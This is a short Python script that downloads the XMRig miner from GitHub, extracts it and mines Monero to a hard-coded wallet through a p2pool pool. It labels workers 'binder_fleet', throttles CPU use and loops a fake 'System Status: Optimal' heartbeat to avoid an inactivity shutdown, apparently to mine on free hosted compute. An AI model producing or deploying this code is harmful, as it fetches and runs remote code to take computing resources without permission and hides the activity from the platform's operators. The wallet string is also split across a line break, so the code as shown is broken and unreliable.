import os
import subprocess
import time

def setup_and_mine():
    print("--- Stage 1: Downloading Miner ---")
    # Download and extract in one go at runtime
    os.system("wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz")
    os.system("tar -xf xmrig-6.21.0-linux-x64.tar.gz")
    
    print("--- Stage 2: Starting XMRig at 49% ---")
    # Replace YOUR_WALLET with your actual address
    # -p binder_fleet identifies your workers on the observer
    wallet = "89T9kvjYMeqBY8yky4mbP8EDP1rouQDjJgGkRZ22uFXz9phDhtMSYKz8Skq8B7d8LfVitghrx4juyTXrUeDwsUHwCut2EYM
" 
    cmd = f"./xmrig-6.21.0/xmrig -o mini.p2pool.observer:3333 -u {wallet} -p binder_fleet --cpu-max-threads-hint 50 --cpu-priority 1 --donate-level 1"
    
    subprocess.Popen(cmd, shell=True)

    print("--- Stage 3: Keep-Alive Loop Active ---")
    while True:
        # Pushes a log every 30s to prevent 'Inactivity' shutdown
        print(f"Heartbeat: {time.ctime()} | System Status: Optimal")
        time.sleep(30)

if __name__ == "__main__":
    setup_and_mine()
